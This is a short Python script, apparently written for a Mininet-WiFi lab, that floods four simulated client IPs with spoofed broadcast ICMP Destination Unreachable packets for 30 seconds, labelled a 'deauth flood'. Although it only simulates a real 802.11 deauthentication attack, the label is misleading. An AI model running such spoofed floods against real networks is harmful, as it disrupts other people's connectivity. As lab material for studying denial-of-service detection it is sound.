#!/usr/bin/env python3
"""
Attack generator script to simulate de-auth flood on AP1 clients:
- Sends spoofed ICMP Destination Unreachable packets at ~50 fps
- Targets sta1, sta2, sta3, sta4 IPs in 10.0.1.0/24 subnet
- Run inside attacker xterm in Mininet-WiFi
"""

import time
from scapy.all import Ether, IP, ICMP, sendp

victim_ips = ['10.0.1.1', '10.0.1.2', '10.0.1.3', '10.0.1.4']

attacker_mac = "00:11:22:33:44:55"
attacker_ip = "192.168.0.100"

fps = 50
duration = 30

def flood_deauth():
    print(f"Starting deauth flood: {fps} fps for {duration} seconds...")
    interval = 1.0 / fps
    end_time = time.time() + duration

    while time.time() < end_time:
        for victim_ip in victim_ips:
            pkt = (Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src=attacker_ip, dst=victim_ip) /
                   ICMP(type=3, code=7))  # ICMP Dest Unreachable (simulate deauth)
            sendp(pkt, verbose=False)
            time.sleep(interval / len(victim_ips))

    print("Deauth flood completed.")

if __name__ == "__main__":
    flood_deauth()
